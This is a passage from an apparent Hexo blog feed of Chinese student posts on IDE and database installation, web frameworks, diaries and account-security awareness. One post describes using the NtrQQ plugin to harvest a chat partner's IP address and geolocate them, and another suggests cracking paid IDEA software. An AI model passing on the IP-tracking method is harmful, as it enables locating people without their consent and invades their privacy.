        <content type="html"><![CDATA[<h3 id="事故的发生"><a href="#事故的发生" class="headerlink" title="事故的发生"></a>事故的发生</h3><p>本以为我的电脑永远不会发生意外，重装系统这种事情永远也不会轮到我身上，也有可能是前有因后有果，前者git仓库坏了修复不了，于是我就想着重装系统能不能修好！于是有了新大陆的发现。</p><h3 id="资源地址"><a href="#资源地址" class="headerlink" title="资源地址"></a>资源地址</h3><p><a href="https://zhutix.com/tools/mydock/" target="_blank" rel="noopener">Mac系统集成</a><br><a href="https://zhutix.com/tools/" target="_blank" rel="noopener">win10主题替换</a></p><h3 id="警告"><a href="#警告" class="headerlink" title="警告"></a>警告</h3><p>在使用这些插件一定要系统备份，因为这些插件有可能会导致系统异常无法恢复的状态。</p><h3 id="壁纸下载"><a href="#壁纸下载" class="headerlink" title="壁纸下载"></a>壁纸下载</h3><p><a href="http://pic.netbian.com/" target="_blank" rel="noopener">下在地址</a><br>网站上壁纸图片的质量都不错，但是一天只能下载一张图片。<br><a href="http://www.win4000.com/" target="_blank" rel="noopener">下载地址</a><br>这个下了几个好像是免费的。质量也挺好<br><a href="http://www.win4000.com" target="_blank" rel="noopener">下载地址</a></p><h3 id="美女壁纸"><a href="#美女壁纸" class="headerlink" title="美女壁纸"></a>美女壁纸</h3><p><a href="https://www.vmgirls.com/" target="_blank" rel="noopener">下载地址</a></p>]]></content>
      
      
      <categories>
          
          <category> 系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
            <tag> MAC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓安装</title>
      <link href="/2019/10/15/as/asset/"/>
      <url>/2019/10/15/as/asset/</url>
      
        <content type="html"><![CDATA[<h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>这个编译器，一开始装比较困难，但是当你经历失败重装几次系统之后，那么我觉得你应该对AS的安装轻车熟路，比如我一开始安装，电脑就半身不遂了，一定要非常小心的装！不要乱选，当然，如果你运气很好，当我没讲。</p><h3 id="图文教程"><a href="#图文教程" class="headerlink" title="图文教程"></a>图文教程</h3><p>安装包，我也没有，官网下，一定要耐心，安装过程也如此，没有演示到的细节就默认选择。<br>我相信你已经下载好了安装包<br><img src="http://img.ahdy.top/2019-10-14_192723.png" alt="AS-3.5版本为例"><br><img src="http://img.ahdy.top/2019-10-14_192747.png" alt><br><img src="http://img.ahdy.top/2019-10-14_192851.png" alt><br><img src="http://img.ahdy.top/2019-10-14_192859.png" alt><br><img src="http://img.ahdy.top/2019-10-14_192946.png" alt><br><img src="http://img.ahdy.top/2019-10-14_193044.png" alt><br><img src="http://img.ahdy.top/2019-10-14_193105.png" alt><br><img src="http://img.ahdy.top/2019-10-14_193155.png" alt><br><img src="http://img.ahdy.top/2019-10-14_193252.png" alt><br><img src="http://img.ahdy.top/2019-10-14_193357.png" alt><br><img src="http://img.ahdy.top/2019-10-14_193408.png" alt><br><img src="http://img.ahdy.top/2019-10-14_193432.png" alt><br><img src="http://img.ahdy.top/2019-10-14_194441.png" alt><br><img src="http://img.ahdy.top/2019-10-14_194455.png" alt><br><img src="http://img.ahdy.top/2019-10-14_194615.png" alt><br><img src="http://img.ahdy.top/2019-10-14_195914.png" alt="此界面等待所有缓冲完成！"></p><h3 id="虚拟机安装"><a href="#虚拟机安装" class="headerlink" title="虚拟机安装"></a>虚拟机安装</h3><p>手机配置可以根据需求设置<br><img src="http://img.ahdy.top/2019-10-14_201340.png" alt="选择右上角按钮"><br><img src="http://img.ahdy.top/2019-10-14_201416.png" alt><br><img src="http://img.ahdy.top/2019-10-14_201519.png" alt="这里我选了个占屏比高的"><br><img src="http://img.ahdy.top/2019-10-14_201557.png" alt="选了安卓10.0系统"><br><img src="http://img.ahdy.top/2019-10-14_201623.png" alt="等待下载"><br><img src="http://img.ahdy.top/2019-10-14_203621.png" alt="完成"><br><img src="http://img.ahdy.top/2019-10-14_203734.png" alt="finsh"><br><img src="http://img.ahdy.top/2019-10-14_204142.png" alt="怎么样是不是很好看"></p>]]></content>
      
      
      <categories>
          
          <category> AS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AS </tag>
            
            <tag> 环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GitHub仓库</title>
      <link href="/2019/10/14/framework/hexogithub/"/>
      <url>/2019/10/14/framework/hexogithub/</url>
      
        <content type="html"><![CDATA[<p>不知道怎么了，前段时间github仓库突然传不上文件了，于是我决定写个文档记录一下。<br>写博客，如果想免费托管你的网站，就要用到github仓库，这个仓库非常特殊，它解析能掉你项目内的网页文件，总而言之，它相当于一个免费的服务器，如果想搭建一个博客，就要去选一个博客框架进行套用，然后下载你喜欢的博客主题到本地，配置好之后就能上传到GitHub仓库了，<br>关于博客框架的使用，建议去它们的官方查看文档进行学习</p><h3 id="hexo框架"><a href="#hexo框架" class="headerlink" title="hexo框架"></a>hexo框架</h3><p><a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">官方文档</a></p><h3 id="ssh创建"><a href="#ssh创建" class="headerlink" title="ssh创建"></a>ssh创建</h3><p><a href="https://blog.csdn.net/u013778905/article/details/83501204" target="_blank" rel="noopener">CSDN</a></p>]]></content>
      
      
      <categories>
          
          <category> GitHub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> GitHub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA开发利器IDEA</title>
      <link href="/2019/10/13/java/javatool/"/>
      <url>/2019/10/13/java/javatool/</url>
      
        <content type="html"><![CDATA[<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>工欲善其事必先~~~算了，其实这就是个编译器，不过功能非常强大，jetbre…家的（单词不会拼），见谅！在使用安装之前，你的电脑上需要安装java1.8.0以上的jdk，并且确保在cmd下，Java，javac，java -version等命令正常显示，因为…嗯，懂不懂无所谓，会敲代码就行。</p><h3 id="安装步骤截图"><a href="#安装步骤截图" class="headerlink" title="安装步骤截图"></a>安装步骤截图</h3><p>首先，你需要百度一下，搜IDEA就能找到它家的官网，然后把这个编译器安装包下载下来，X64就是64位操作系统装的，X86就是32位系统装的，别装错了！<br><img src="http://img.ahdy.top/2019-10-12_224104.png" alt><br><img src="http://img.ahdy.top/2019-10-12_224233.gif" alt><br><img src="http://img.ahdy.top/2019-10-12_224526.gif" alt><br><img src="http://img.ahdy.top/2019-10-12_224538.gif" alt><br><img src="http://img.ahdy.top/2019-10-12_224547.gif" alt><br><img src="http://img.ahdy.top/2019-10-12_224910.gif" alt><br><img src="http://img.ahdy.top/2019-10-12_224933.gif" alt><br>选择跳过<br><img src="http://img.ahdy.top/2019-10-12_224952.gif" alt><br>dont send 不发送<br><img src="http://img.ahdy.top/2019-10-12_225033.gif" alt><br><img src="http://img.ahdy.top/2019-10-12_225225.gif" alt><br>这边它应该是说一些插件跟工具，我也没用过不会用 所以默认就好<br><img src="http://img.ahdy.top/2019-10-12_225334.png" alt><br><img src="http://img.ahdy.top/2019-10-12_225455.png" alt><br>这软件其实要钱的，而且好贵正版一年四千多，不过你百度一下就会找到激活码可以用，而且这个软件是有破解方法的。<br><img src="http://img.ahdy.top/2019-10-12_225531.png" alt><br>安装好了以后就是这个样子<br><img src="http://img.ahdy.top/2019-10-12_230301.png" alt><br>如果不会创建Java项目可以点下面链接<br><a href="https://jingyan.baidu.com/article/bad08e1ecafcdf09c9512179.html" target="_blank" rel="noopener">百度经验</a></p><h3 id="快速创建web项目"><a href="#快速创建web项目" class="headerlink" title="快速创建web项目"></a>快速创建web项目</h3><p>当你用了一段时间后会发现，这个编译器大有学问，比起eclipse要爽很多的感觉。<br><img src="http://img.ahdy.top/2019-10-13_221521.png" alt="file-&gt;new project"><br><img src="http://img.ahdy.top/2019-10-13_221656.png" alt><br>这里你需要加上tomcat服务器，勾选webapplication，下一步<br><img src="http://img.ahdy.top/2019-10-13_221736.png" alt><br><img src="http://img.ahdy.top/2019-10-13_222001.png" alt></p><h4 id="web项目完成"><a href="#web项目完成" class="headerlink" title="web项目完成"></a>web项目完成</h4>]]></content>
      
      
      <categories>
          
          <category> 编译器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IP获取及定位</title>
      <link href="/2019/10/11/attark/findip/"/>
      <url>/2019/10/11/attark/findip/</url>
      
        <content type="html"><![CDATA[<h3 id="NTRQQ插件集成"><a href="#NTRQQ插件集成" class="headerlink" title="NTRQQ插件集成"></a>NTRQQ插件集成</h3><p>NtrQQ可以点亮各种钻的图标，本功能可本地开启所有业务图标（别人不可见），开启此功能后还可享受绿钻的特权：比如在群内可分享歌曲给你的群友。QQ越做越大，内存占用越来越高，那点小内存根本不够用，打开内存整理这个功能可以自动定时定点整理内存。平时有很多QQ自带组件根本就用不到，您可以自己动手借助本软件的插件过滤功能关掉  </p><p>总之这个插件，非常强，能够破解掉QQ上很多权限，最主要的是它显示IP的功能，通过远程对话，或者在线传输文件就能获取到对方的IP地址，有了IP地址就能对其定位，找到对方大概的位置，其实也可以通过一些抓包软件抓到对方的外网IP，但那并不适合新手。这个插件在一年前就停止了更新（涉嫌侵权），但留下来的插件被其他大牛继续优化更新。<br><a href="http://www.carrotchou.blog/17112.html" target="_blank" rel="noopener">ntrqq插件</a>  </p><p><a href="https://www.lanzous.com/i66ured" target="_blank" rel="noopener">下载</a><br>插件内包含使用说明文档，看文档进行操作。<br>细节操作自行挖掘，因：（散播教程侵犯他人隐私）<br><img src="http://img.ahdy.top/2019-10-11_112309.png" alt="集成成功演示图"></p><h3 id="木子李QQ"><a href="#木子李QQ" class="headerlink" title="木子李QQ"></a>木子李QQ</h3><p>这可能是一个笔名为木子李的人利用NTRQQ插件集成的QQ，但是自NTRQQ站长被腾讯告了之后，今年木子李QQ停止了对显示IP功能的开放，但其它功能也非常好，可以百度了解一下。  </p><h3 id="利用地图开放接口定位"><a href="#利用地图开放接口定位" class="headerlink" title="利用地图开放接口定位"></a>利用地图开放接口定位</h3><p>以百度地图为例子，首先百度一下，搜索百度地图开放平台，登陆百度账号。<br><img src="http://img.ahdy.top/2019-10-11_101554.png" alt><br>在上方功能与服务当中，选择定位<br><img src="http://img.ahdy.top/2019-10-11_101845.png" alt><br>查看文档使用<br><img src="http://img.ahdy.top/2019-10-11_105344.png" alt><br><img src="http://img.ahdy.top/2019-10-11_105424.png" alt><br><img src="http://img.ahdy.top/2019-10-11_105713.png" alt="效果图"><br>经纬度都有了，是不是够精确了？其实并不是，这个点只能算是阵眼。至于它网络的覆盖面积有多大，还是个谜！</p><h3 id="IP地址查询"><a href="#IP地址查询" class="headerlink" title="IP地址查询"></a>IP地址查询</h3><p>现在有很都查ip的工具，百度搜索精准IP查询，当然这些网站都具有时效性，说不定哪时候就访问不到了<br><a href="http://chaipip.com/ip.php" target="_blank" rel="noopener">精准查询</a>   </p>]]></content>
      
      
      <categories>
          
          <category> IP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> IP </tag>
            
            <tag> 定位 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>账号是如何被盗的？</title>
      <link href="/2019/10/09/attark/websafty/"/>
      <url>/2019/10/09/attark/websafty/</url>
      
        <content type="html"><![CDATA[<h3 id="被神化的黑客"><a href="#被神化的黑客" class="headerlink" title="被神化的黑客"></a>被神化的黑客</h3><p>在这个信息时代，黑客这个名词已经被抽象化，原因是真正的黑客十分稀少，加上黑客行为非常神秘，各种小学生行为的夸大，黑客最终被神化，成为万能侠，背锅侠。</p><h3 id="盗号有多难"><a href="#盗号有多难" class="headerlink" title="盗号有多难"></a>盗号有多难</h3><p>以腾讯的QQ为例，早在2005年以前，是可以通过数据字典暴力出QQ的密码，但之后验证码机制的出现使得这种方法暴毙，账号的密码都是存放在数据库当中的，hacker不会担着这么大风险，去搬倒腾讯，阿里的服务器，和法律对着干，当然最主要的原因是没有那个水平，所以黑进什么什么管理系统，基本是无稽之谈。在传输过程中，密码会被加密，以密文形式存进数据库，至于是什么加密方式，还要进行分析，反编译，解算，所以就算hacker暴库了很多用户数据，也不会对用户造成直接损害。这就体现了设置密码的技术，设置密码其实也是一门艺术，尽量使用组合密码，不要设置的过于简单，比如大小写字母+数字+特殊符号，这样的密码经过加密后一般是无法被破解的！</p><h4 id="不要把多个账户密码设置成同一个！"><a href="#不要把多个账户密码设置成同一个！" class="headerlink" title="不要把多个账户密码设置成同一个！"></a>不要把多个账户密码设置成同一个！</h4><p>这个概念在安全领域叫做撞库，就是你的一个密码泄露，可能会导致多个账号丢失，其实真正hacker是需要会很多东西的，能被成为hacker的人那得是计算机领域的天才！他需要会各种编程语言，能够制造木马，编写想要的蠕虫，同时精通算法，心理学，密码学，社会工程学，法律等，才能做到游走于刀尖之上。</p><h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>最近，经常看到很多人微信，QQ号被盗，盗号者利用人际关系进行钱财诈骗，先不说安全意识的问题，账号被盗一般跟个人使用有直接关系，可能是受到某种诱惑，好奇心的左右，为什么这么说，因为80%的账号密码的泄露都是因为钓鱼网站。</p><h3 id="钓鱼网站"><a href="#钓鱼网站" class="headerlink" title="钓鱼网站"></a>钓鱼网站</h3><p>这是一个非常形象的词，通常钓鱼网站的页面做的非常逼真，能够与官方网站媲美，达到以假乱真（当然也有做的很垃圾的），一般点进去条鱼网站不做任何操作，账号不会被盗，但是当用户输入了账号，密码登陆才能领取某些奖励的时候，你所输入的账号密码就会被该网站的后台记录，他轻而易举的得到了你的账号密码，所以一般像什么中大奖了，免费送点卷领皮肤，这里面的照片是你吗？这些都是高危词！还要那些来历不明的连接，来历不明的活动，让扫二维码的，一律不要贪图小便宜！就记住一句话，天上不会掉馅饼，有也不会砸到你。嗯，没错！</p><h3 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h3><p>木马这个词的由来就是，经典的特洛伊木马，从内部打破防御，有些木马潜行的非常深，这个东西就像人体的病毒一样，说不定哪个时候就会爆发，对于木马的防范，只能提高警惕，不要乱下载东西，这样就能最大可能的减少被植入木马的风险，当然现在的杀毒软件都很厉害，如果一个木马能过得了毒杀，那…确实就算你倒霉！！毕竟病毒库这个东西，是定期更新的。</p><h3 id="嗅探"><a href="#嗅探" class="headerlink" title="嗅探"></a>嗅探</h3><p>这个词一般针对于局域网内，嗅探与监听通常结合使用，这类安全隐患主要作用于公共场合（危害极大），比如免费wifi，这类WiFi可以是被设置好的陷阱，通过某些工具，就能对流经路由器的数据进行抓取，比如浏览那些网站，账号密码，一些文本信息，都会被抓取到本地，说到这个有点像大数据的爬虫，其实不然，现在很多软件在安装的时候就已经被授权，可以读取用户的信息，大数据采集这些信息，就实现了针对用户的推送，比如，你百度搜个物品，打开淘宝发现淘宝给你推送了这类商品，然后再打开抖音，发现抖音也给你推类似的视频广告，我不知到这是否算是侵犯了用户的隐私，但用户的日常行为确实在互联网当中是透明的，希望未来能够遵循GDPR的规则合法采集数据。</p><h3 id="服务商的阴谋"><a href="#服务商的阴谋" class="headerlink" title="服务商的阴谋"></a>服务商的阴谋</h3><p>现在使用任何软件基本上都需要注册，注册过程其实变向丢失了你的个人信息，这些服务商可以变卖你的个人信息，有时候注册了一些litter软件，推销信息多了，广告信息也多了，卖保险，卖房电话经常打来，说出来你可能不信，推销，骚扰电话占据了我大片通话记录，我与他们之间的联系也非常密切，典型的就是拼刀刀砍价，什么就差你一刀……</p><h4 id="这个世界-想要得到什么，就要付出一些什么，很真实！"><a href="#这个世界-想要得到什么，就要付出一些什么，很真实！" class="headerlink" title="这个世界 想要得到什么，就要付出一些什么，很真实！"></a>这个世界 想要得到什么，就要付出一些什么，很真实！</h4>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>开学总结</title>
      <link href="/2019/10/04/draiy/mind/"/>
      <url>/2019/10/04/draiy/mind/</url>
      
        <content type="html"><![CDATA[<p>不知不觉，日子过的很快，转眼间就到了国庆，暑假带给我的浮躁，并没有因此结束，我想着是不是我经不起失败，我内心一旦焦虑，很长一段时间内，都在彷徨的阴影下度过，我常常借酒消愁，一天到晚游戏，睡觉来麻痹自己，我不知道是怎么了，有时的我表现的特别积极，有时候特别消沉，间接性自律，对待事物也是多愁善感~<br>这学期，学校开设了很多课，我的缺点在安卓上得到了质的放大，安卓这门课，开发环境是一个难点，其细节也是安卓最主要的学习点，我本以为，我的缺点会随着年龄的增长慢慢，淡化，但是我想错了，我的马虎不认真，使我屡次碰壁，我为什么遇到困难挫折就选择逃避呢？这也是我经常在反思的问题。学习了一年编程了，我有种越学越不会，学了不想学的感觉，我突然想起那句，任何兴趣变成职业都不将再是兴趣。我可真会给自己的懒惰，逃避困难找理由！……<br>可能我是真的欠揍吧！<br>希望多年以后，再看到这篇日记，我对待事物，从容不迫，不再那么易挫，焦虑。  </p>]]></content>
      
      
      <categories>
          
          <category> 日记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记 </tag>
            
            <tag> 生活 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Layui</title>
      <link href="/2019/10/01/framework/layui/"/>
      <url>/2019/10/01/framework/layui/</url>
      
        <content type="html"><![CDATA[<p>时常听老师讲做后端开发的多少都得会点前端，但是写前端的话框架又不能太丑，这时候使用框架让我们在开发上如虎添翼。</p><h3 id="layui框架概述"><a href="#layui框架概述" class="headerlink" title="layui框架概述"></a>layui框架概述</h3><p>很久以前，我为写不出优美的web界面发愁时，杨爽老哥（学长）告诉了我这个框架，俗话说的好，与贤一席话，胜读十年书，在后续的界面开发过程中，这个框架帮我解决了很多问题。<br>据我使用过后的观点，首先它比较容易上手，在操作上比bootstarp要简易，文档通俗易懂。<br>了解更多可以百度一下。</p><h3 id="框架下载"><a href="#框架下载" class="headerlink" title="框架下载"></a>框架下载</h3><p><a href="https://www.layui.com/" target="_blank" rel="noopener">layui官网</a><br>下载好了之后，将文件导入编译器<br><img src="http://img.ahdy.top/2019-09-18_203546.png" alt="演示图"></p><h3 id="如何使用layui"><a href="#如何使用layui" class="headerlink" title="如何使用layui"></a>如何使用layui</h3><p><a href="https://www.layui.com/doc/" target="_blank" rel="noopener">layui官方文档</a>  </p><p><a href="https://pan.baidu.com/s/1NxGgdZhjyX3s8iLNYrP36g#list/path=%2F" target="_blank" rel="noopener">layui视频教程</a></p><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><p>在使用框架时请务必引入相应的js/css<br>在使用文档中相应的模板时请务必将外联css/js，修改为你本地地址。<br>clss需要根据特有的参数引入<br>多框架引入可能会出现索引，布局冲突。</p>]]></content>
      
      
      <categories>
          
          <category> 框架 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 框架 </tag>
            
            <tag> Layui </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三级数据库</title>
      <link href="/2019/09/15/draiy/threecomputer/"/>
      <url>/2019/09/15/draiy/threecomputer/</url>
      
        <content type="html"><![CDATA[<h3 id="大难在即"><a href="#大难在即" class="headerlink" title="大难在即"></a>大难在即</h3><p>端午节几天假，浑浑噩噩，玩了几天游戏，突然想起来还有国三没有准备，于是我现在浪子回头，决定立下一个flag。  </p><p>今天是2019年九月十五日，距离考试还有不到一个礼拜，目前我一点题目都没有看，大题基本不会，我决定逆袭一把，你猜我能够成功吗？<br>绝地求生，如果我考完感觉不错的话我会继续更新这篇文章，如果我考过的话，我会分享我几天考过数据库的经验，如果我没有更新那就证明我已经凉了。</p><h3 id="未完待续···"><a href="#未完待续···" class="headerlink" title="未完待续···"></a>未完待续···</h3><h3 id="续写"><a href="#续写" class="headerlink" title="续写"></a>续写</h3><p>三级已挂，明年再战！<br>二战加油。</p><h3 id="2020-1-7"><a href="#2020-1-7" class="headerlink" title="2020/1/7"></a>2020/1/7</h3><p>又报了，这次不过，我…之后再说吧</p>]]></content>
      
      
      <categories>
          
          <category> robot </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日记 </tag>
            
            <tag> 三级 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Oracle安装与连接</title>
      <link href="/2019/09/11/web/mysql4/"/>
      <url>/2019/09/11/web/mysql4/</url>
      
        <content type="html"><![CDATA[<h3 id="Oracle数据库简介"><a href="#Oracle数据库简介" class="headerlink" title="Oracle数据库简介"></a>Oracle数据库简介</h3><p>Oracle也是甲骨文公司的名字，这个公司在IT行业的权重就不用说了呗，该公司推行的Oracle数据库也是十分优秀，在数据库领域一直处于领先地位的产品。可以说Oracle数据库系统是目前世界上流行的关系数据库管理系统，系统可移植性好、使用方便、功能强，适用于各类大、中、小、微机环境。它是一种高效率、可靠性好的、适应高吞吐量的数据库方案。<br>特点：安全,稳定</p><h3 id="Oracle安装"><a href="#Oracle安装" class="headerlink" title="Oracle安装"></a>Oracle安装</h3><p><a href="https://www.oracle.com/technetwork/cn/database/enterprise-edition/downloads/oracle12c-windows-3633015-zhs.html" target="_blank" rel="noopener">官网安装地址</a><br>需要注意的两点。  </p><ol><li>需要注册登陆oracle  </li><li>需要接受协议才能下载<br><img src="http://img.ahdy.top/2019-09-11_143417.png" alt><br>下载解压好如下图，选择.exe文件就能安装，最好退出360，关闭防火墙等，以防出现意外！<br><img src="http://img.ahdy.top/2019-09-11_144707.png" alt><br><img src="http://img.ahdy.top/2019-09-11_145321.png" alt><br><img src="http://img.ahdy.top/2019-09-11_145528.png" alt><br><img src="http://img.ahdy.top/2019-09-11_145721.png" alt><br><img src="http://img.ahdy.top/2019-09-11_151035.png" alt><br><img src="http://img.ahdy.top/2019-09-11_151104.png" alt></li></ol><p><img src="http://img.ahdy.top/2019-09-11_151254.png" alt><br><img src="http://img.ahdy.top/2019-09-11_151132.png" alt><br><img src="http://img.ahdy.top/2019-09-11_151500.png" alt><br><img src="http://img.ahdy.top/2019-09-11_151543.png" alt><br><img src="http://img.ahdy.top/2019-09-11_151629.png" alt><br><img src="http://img.ahdy.top/2019-09-11_151727.png" alt><br><img src="http://img.ahdy.top/2019-09-11_151852.png" alt><br><img src="http://img.ahdy.top/2019-09-11_151904.png" alt><br><img src="http://img.ahdy.top/2019-09-11_152011.png" alt><br><img src="http://img.ahdy.top/2019-09-11_152111.png" alt><br><img src="http://img.ahdy.top/2019-09-11_152209.png" alt><br><img src="http://img.ahdy.top/2019-09-11_152448.png" alt><br><img src="http://img.ahdy.top/2019-09-11_152629.png" alt><br><img src="http://img.ahdy.top/2019-09-11_152756.png" alt></p><h4 id="先决条件可以选择忽略！"><a href="#先决条件可以选择忽略！" class="headerlink" title="先决条件可以选择忽略！"></a>先决条件可以选择忽略！</h4><p><img src="http://img.ahdy.top/2019-09-11_165410.png" alt><br><img src="http://img.ahdy.top/2019-09-11_165206.png" alt></p><h4 id="等待"><a href="#等待" class="headerlink" title="等待"></a>等待</h4><p>该过程非常漫长······给我等死了都！！！<br><img src="http://img.ahdy.top/2019-09-11_170004.png" alt></p><h4 id="安装成功"><a href="#安装成功" class="headerlink" title="安装成功"></a>安装成功</h4><p><img src="http://img.ahdy.top/2019-09-11_172612.png" alt></p><h4 id="测试是否安装成功"><a href="#测试是否安装成功" class="headerlink" title="测试是否安装成功"></a>测试是否安装成功</h4><p>打开开始菜单，最近添加，找到sql plus，打开后输入用户名及密码<br><img src="http://img.ahdy.top/2019-09-11_175317.png" alt><br>出现连接到xxxxx之后oracle已经彻底安装成功！<br>注意：这里的用户名是orcale自带的超级管理员，密码是你在安装过程中中设置的任何用户通用密码。</p><h3 id="密码修改"><a href="#密码修改" class="headerlink" title="密码修改"></a>密码修改</h3><p><a href="https://www.cnblogs.com/xujiating/p/6337511.html" target="_blank" rel="noopener">此处学习</a></p><h3 id="图形化工具下载"><a href="#图形化工具下载" class="headerlink" title="图形化工具下载"></a>图形化工具下载</h3><p><a href="https://www.jetbrains.com/zh/datagrip/promo/?utm_source=baidu&amp;utm_medium=cpc&amp;utm_campaign=cn-bai-br-datagrip-ex-pc&amp;utm_content=datagrip-pure&amp;utm_term=datagrip" target="_blank" rel="noopener">DataGrip下载</a><br>假如你有多个数据库，比如电脑上既有MySQL，又有orcale，那么建议使用DataGrip，其拥有强大的索引及支持多库连接的功能！</p><h4 id="图形化工具安装教程"><a href="#图形化工具安装教程" class="headerlink" title="图形化工具安装教程"></a>图形化工具安装教程</h4><p><a href="https://jingyan.baidu.com/article/86112f13b2a9ee273797871a.html" target="_blank" rel="noopener">百度教程</a></p><h4 id="Datagrip连接数据库"><a href="#Datagrip连接数据库" class="headerlink" title="Datagrip连接数据库"></a>Datagrip连接数据库</h4><p>File -&gt; new -&gt;project -&gt;起一个项目名-&gt;database-&gt;+ -&gt;data source -&gt;创建你需要的数据库</p><h5 id="orcale连接"><a href="#orcale连接" class="headerlink" title="orcale连接"></a>orcale连接</h5><p><img src="http://img.ahdy.top/2019-09-12_100940.png" alt></p><p>如果test测试不成功可以切换Driver进行尝试，并确保orcale的基本服务都已经启动  </p><p>默认的SID是orcl一般都不会对它进行修改，你修改了它并且忘记了Sid可以从<a href="https://jingyan.baidu.com/article/f25ef2549a7e58482c1b82f7.html" target="_blank" rel="noopener">查看sid方法</a>知道你的SID。  </p><p> —在默认情况下，SID的名称和数据库的名称是完全一致的，在网络上使用的是SID名称。</p><h5 id="mysql连接"><a href="#mysql连接" class="headerlink" title="mysql连接"></a>mysql连接</h5><p><img src="http://img.ahdy.top/2019-09-12_101658.png" alt><br>在连接MySQL时可能会出现这种报错<br>解决方法：<br>关联mysql失败_Server returns invalid timezone. Go to ‘Advanced’ tab and set ‘serverTimezon’<br>时区错误，MySQL默认的时区是UTC时区，比北京时间晚8个小时。</p><p>所以要修改mysql的时长</p><p>在mysql的命令模式下，输入：</p><p>set global time_zone=’+8:00’;<br><img src="http://img.ahdy.top/2019-09-12_101926.png" alt><br>再次进行测试连接，发现连接成功！<br><img src="http://img.ahdy.top/2019-09-12_102039.png" alt><br>成功建立连接后你就可以使用图形化工具对数据库进行增删改查！</p><h3 id="服务禁用"><a href="#服务禁用" class="headerlink" title="服务禁用"></a>服务禁用</h3><p>orcale的后台服务非常拖慢系统运行，建议讲orcale服务修改为手动启动，这样在开机的时候就不会自启。<br>而每次启动的时候，只需要启动两个服务即可：</p><ol><li><p>OracleOraDb11g_home1TNSListener  （监听服务，如果要通过程序或者不同的客户端连接Oracle数据库的时候， 此服务必须启动，否则无法连接。如是自己在本机上操作Oracle，则不需要启动该服务）</p></li><li><p>OracleServiceORCL （数据库的实例服务–保存所有的数据，它的命名标准:OracleServiceSID，每当为系统增加一个数据库的时候，都会出现一个类似的服务名称）</p></li><li><p>查看后台服务的方法，打开控制面板。找到管理工具-&gt;服务<br><img src="http://img.ahdy.top/2019-09-12_103831.png" alt><br><img src="http://img.ahdy.top/2019-09-12_103859.png" alt></p><h3 id="orcale安装失败"><a href="#orcale安装失败" class="headerlink" title="orcale安装失败"></a>orcale安装失败</h3><p>安装失败可能是中断了安装程序，或者装了多个orcale<br>需要卸载干净之后重装。<br>注: 卸载之后可能无法立刻安装成功</p><p> 1.Oracle正常安装完成</p><pre><code>     -- 使用Oracle提供的卸载程序     -- 重新启动电脑，进入到安全模式(启动时按住F8)     -- 找到系统上的对应的磁盘路径，并且删除     -- 运行注册表命令 regedit.exe，搜索所有与oracle有关的内容，并且删除     -- 程序启动电脑后就可以重新执行安装</code></pre><p> 2.Oracle安装失败</p><pre><code>     -- 重新启动电脑，进入到安全模式(启动时按住F8)     -- 找到系统上的对应的磁盘路径，并且删除     -- 运行注册表命令 regedit.exe，搜索所有与oracle有关的内容，并且删除     -- 程序启动电脑后就可以重新执行安装</code></pre></li></ol><p>如果以上操作不行，就需要重新安装操作系统了。</p>]]></content>
      
      
      <categories>
          
          <category> Oracle </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 环境 </tag>
            
            <tag> Oracle </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JSP</title>
      <link href="/2019/09/04/web/heml7/"/>
      <url>/2019/09/04/web/heml7/</url>
      
        <content type="html"><![CDATA[<h3 id="JSP发展史"><a href="#JSP发展史" class="headerlink" title="JSP发展史"></a>JSP发展史</h3><p>早年说到JAVA Web，那么最具体现力的就是 JSP，但随着时间的发展，原生JSP渐渐淡出了舞台，因为其前后端代码的结合，即是它的优点，又是它的缺点，在团队模块开发上，造成了很大困难，影响团队协作能力，取而代之的是ajax，Ajax的出现使前后端人员可以分工协作，前端不再会为JSP当中的Java代码而苦恼，也很大程度上提高了开发效率。</p><h3 id="JSP格式"><a href="#JSP格式" class="headerlink" title="JSP格式"></a>JSP格式</h3><p><img src="http://img.ahdy.top/2019-09-04_153117.png" alt><br>如你所见，JSP的格式非常像一个HTML网页，那么它的特点在？<br>她最大的特点就是能嵌入Java代码，实现很多由Java代码组合的功能</p><pre><code>&lt;% 代码片段 %&gt; 在括号内写入Java代码  &lt;%! declaration; [ declaration; ]+ ... %&gt; 声明&lt;%= 表达式 %&gt;&lt;%-- 该部分注释在网页中不会被显示--%&gt; &lt;%@ directive attribute=&quot;value&quot; %&gt; 指令</code></pre>]]></content>
      
      
      <categories>
          
          <category> JSP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 语法 </tag>
            
            <tag> JSP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络传输协议</title>
      <link href="/2019/09/03/web/html6/"/>
      <url>/2019/09/03/web/html6/</url>
      
